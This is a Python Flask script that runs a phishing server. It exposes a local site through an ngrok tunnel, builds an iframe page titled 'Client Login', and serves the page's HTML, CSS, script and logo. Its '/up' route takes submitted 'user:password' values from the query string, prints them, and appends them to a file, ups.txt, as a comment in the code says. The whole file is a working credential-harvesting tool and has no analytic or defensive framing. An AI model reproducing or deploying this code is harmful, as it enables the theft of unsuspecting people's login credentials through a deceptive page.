import requests
from flask import Flask, redirect, url_for, request, jsonify, render_template,make_response,send_file
import os
from pyngrok import ngrok
import time
from colorthief import ColorThief
import requests
import shutil

cwd=os.getcwd()


### connect with ngrok
http_tunnel = ngrok.connect(5111)
address=(str(http_tunnel).split(" ")[1])
address=address.replace("http","https")
print(address)


## edit js file
with open("site/script.js","r") as jsfile:
  jscode=jsfile.readlines()[0]
with open("site/script.js","r") as jsfile:
  fulljs=jsfile.read()
with open("site/script.js","w") as jsfile:
  newcode=fulljs.replace(jscode,f'let address = {address};')
  jsfile.write(newcode)

## create iframe code
with open("frame.html",'w') as framef:
    framef.write(r'''
<!DOCTYPE html>
<head>
</head>
<body style="margin:0";>
'''+'<iframe frameborder="0" height=900vh width=100% title="Client Login" src='+address+"></iframe>\n</body>")


## init flask api
app = Flask(__name__)


## flsk routes
@app.route('/', methods=['GET'])
def sendhtml():
  return send_file(f"{cwd}/site/index.html")

@app.route('/style.css', methods=['GET'])
def sendcss():
  return send_file(f"{cwd}/site/style.css")

@app.route('/script.js', methods=['GET'])
def sendjs():
  return send_file(f"{cwd}/site/script.js")

@app.route('/logo.png', methods=['GET'])
def sendlogo():
  return send_file(f"{cwd}/site/logo.png")

## receive user passwords and save to ups.txt
@app.route('/up', methods=['GET'])
def query_strings():

    user,password = str(request.args['user']).split(':')
    print(f'user:{user} password:{password}')
    with open("ups.txt",'a') as ups:
    	ups.write(request.args['user']+'\n')
    return jsonify({"password":password,"user":user})

## open https address of index.html 
try:os.system(f'start {address[1:-1]}')
except:pass

## open site linkns - iframe.html / index.html / ngrok https link 
os.system(f'start {cwd}\\frame.html')
os.system(f'start {cwd}\\site\\index.html')
os.system(f'start {address[1:-1]}')

## run app on port 5111
app.run(host='0.0.0.0', port=5111,debug=False)

